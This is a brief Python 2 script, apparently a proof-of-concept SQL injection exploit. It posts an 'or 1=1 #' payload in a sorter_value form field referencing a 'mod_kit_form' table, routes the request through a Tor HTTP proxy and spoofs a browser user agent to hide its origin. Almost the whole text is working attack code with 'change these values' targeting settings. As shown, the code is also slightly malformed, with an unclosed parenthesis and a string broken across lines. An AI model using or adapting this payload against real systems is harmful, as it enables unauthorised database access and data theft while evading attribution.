import httplib2, socks, urllib

 ### Change these values ###
 target = "http://example.com";
 SQLi = "or 1=1 #"
 tor_http_proxy = 8118

 httplib2.debuglevel=4

 headers = {
     'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1;
     zh-CN; rv:1.9.1b4) Gecko/20090423 Firefox/3.5b4',
     'Content-Type': 'application/x-www-form-urlencoded'
 }
 h = httplib2.Http(proxy_info = httplib2.ProxyInfo(
     socks.PROXY_TYPE_HTTP, '127.0.0.1', tor_http_proxy, timeout=30)

 data = dict(
     rowID = "1",
     sorter_table = "mod_kit_form",
     sorter_value = "AAAA' %s" % SQLi  # <-- injection
 )

 resp, content = h.request(
     "%s" % target, "POST", urllib.urlencode(data), headers=headers)

print resp
print content

